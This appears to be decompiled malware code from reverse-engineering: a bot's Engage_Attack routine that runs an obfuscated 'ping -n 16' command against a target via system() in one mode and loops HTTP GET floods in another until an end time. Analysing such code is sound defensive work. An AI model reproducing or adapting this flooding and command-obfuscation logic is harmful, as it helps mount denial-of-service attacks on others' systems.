longlong Engage_Attack(char *target_addr,int attack_mode,longlong end_time) {
  undefined8 uVar1;
  char command [49];
  undefined4 hex_4;
  undefined4 hex_3;
  undefined local_2f;
  undefined2 hex_2;
  undefined local_2c;
  undefined4 hex_1;
  undefined2 local_27 [7];
  char Connection_Good_Or_Bad;
  longlong Curr_Time;
  int counter;
  
  Curr_Time = GET_TIME((__time64_t *)0x0);
  do {
    do {
      if (end_time <= Curr_Time)
        return Curr_Time;
      if (attack_mode == 1) {
        hex_1 = 0x31206e;
        hex_2 = 0x6e69;
        local_2c = 0;
        hex_3 = 0x73252036;
        local_2f = 0;
        hex_4 = 0x2d2067;
        local_27[0] = 0x70;
        strcat((char *)local_27,(char *)&hex_2);
        strcat((char *)local_27,(char *)&hex_4);
        strcat((char *)local_27,(char *)&hex_1);
        strcat((char *)local_27,(char *)&hex_3);
        sprintf(command,(char *)local_27,target_addr);
        system(command);
        memset(local_27,0,0xe);
        Sleep(60000);
      }
    } while (attack_mode != 2);
    for (counter = 0; counter < 0x14; counter = counter + 1) {
      uVar1 = GET_Request_Attack(target_addr);
      Connection_Good_Or_Bad = (char)uVar1;
      if (Connection_Good_Or_Bad != '\x01')
        return 0;
      Sleep(1000);
    }
    Sleep(300000);
  } while( true );
}
